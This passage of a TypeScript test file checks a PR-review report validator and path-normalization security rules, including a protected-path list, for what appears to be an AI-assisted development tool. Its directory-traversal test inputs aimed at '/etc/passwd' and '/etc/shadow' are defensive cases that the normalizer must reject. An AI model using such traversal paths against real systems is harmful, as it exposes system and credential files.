  it('rejects report with invalid headSha (not 40 hex chars)', () => {
    const result = validateReport({ ...VALID_REPORT, headSha: 'not-a-sha' });
    expect(result.valid).toBe(false);
  });

  it('rejects report with negative prNumber', () => {
    const result = validateReport({ ...VALID_REPORT, prNumber: -1 });
    expect(result.valid).toBe(false);
  });

  it('rejects report with invalid generatedAt (not ISO 8601)', () => {
    const result = validateReport({ ...VALID_REPORT, generatedAt: '2026-06-02' });
    expect(result.valid).toBe(false);
  });

  it('rejects report with newCodeCoveragePct > 100', () => {
    const result = validateReport({
      ...VALID_REPORT,
      differentialTest: { ...VALID_REPORT.differentialTest, newCodeCoveragePct: 101 },
    });
    expect(result.valid).toBe(false);
  });

  it('rejects report with negative blockingFindings', () => {
    const result = validateReport({
      ...VALID_REPORT,
      consensus: { approved: false, blockingFindings: -1 },
    });
    expect(result.valid).toBe(false);
  });

  it('rejects finding with invalid severity', () => {
    const result = validateReport({
      ...VALID_REPORT,
      reviewers: {
        ...VALID_REPORT.reviewers,
        code: {
          ...VALID_REPORT.reviewers.code,
          findings: [{ severity: 'blocker', message: 'bad', path: 'src/x.ts' }],
        },
      },
    });
    expect(result.valid).toBe(false);
  });
});

// ── Path normalization security invariants ─────────────────────────────────────

describe('RFC-0043 Stage 1 path normalization security invariants', () => {
  it('rejects directory traversal paths', () => {
    expect(normalizePath('../etc/passwd')).toBeNull();
    expect(normalizePath('../../etc/shadow')).toBeNull();
    expect(normalizePath('src/../../../etc/shadow')).toBeNull();
  });

  it('rejects null when path is ambiguous', () => {
    expect(normalizePath('')).toBeNull();
  });

  it('normalizes leading ./ (canonical form)', () => {
    expect(normalizePath('./src/index.ts')).toBe('src/index.ts');
  });

  it('normalizes trailing / (file paths never end with /)', () => {
    expect(normalizePath('src/components/')).toBe('src/components');
  });

  it('unescapes git core.quotePath octal sequences', () => {
    // git encodes non-ASCII paths as octal escapes in double-quoted paths
    // "foo/b\303\251r.ts" should decode to "foo/bér.ts"
    const result = normalizePath('"foo/b\\303\\251r.ts"');
    // Just verify it does not return null (successfully decoded)
    expect(result).not.toBeNull();
  });

  it('denies paths with backslash separators (Windows-style not valid in git diffs)', () => {
    // Bare backslash in non-quoted path
    expect(normalizePath('src\\windows\\style.ts')).toBeNull();
  });

  it('DEFAULT_PROTECTED_PATHS covers all RFC-0043 §Stage 1 defaults', () => {
    const expected = [
      '.github/**',
      '**/.github/**',
      '**/package.json',
      '**/pnpm-lock.yaml',
      '**/package-lock.json',
      '**/yarn.lock',
      '.ai-sdlc/**',
      'ai-sdlc-plugin/agents/**',
    ];
    for (const path of expected) {
      expect(DEFAULT_PROTECTED_PATHS).toContain(path);
    }
  });

  it('DEFAULT_ALLOWED_MUTATION_GLOBS covers RFC-0043 §Stage 1 defaults', () => {
    expect(DEFAULT_ALLOWED_MUTATION_GLOBS).toContain('**/*.ts');
    expect(DEFAULT_ALLOWED_MUTATION_GLOBS).toContain('**/*.md');
    expect(DEFAULT_ALLOWED_MUTATION_GLOBS).toContain('**/*.js');
  });

  it('globToRegex handles ** correctly', () => {
    const re = globToRegex('.github/**');
    expect(re.test('.github/workflows/ci.yml')).toBe(true);
    expect(re.test('.github/dependabot.yml')).toBe(true);
    expect(re.test('src/index.ts')).toBe(false);
  });

  it('matchesAnyGlob works correctly for protected paths', () => {
    expect(matchesAnyGlob('.github/workflows/ci.yml', DEFAULT_PROTECTED_PATHS)).toBe(true);
    expect(matchesAnyGlob('src/index.ts', DEFAULT_PROTECTED_PATHS)).toBe(false);
  });
});
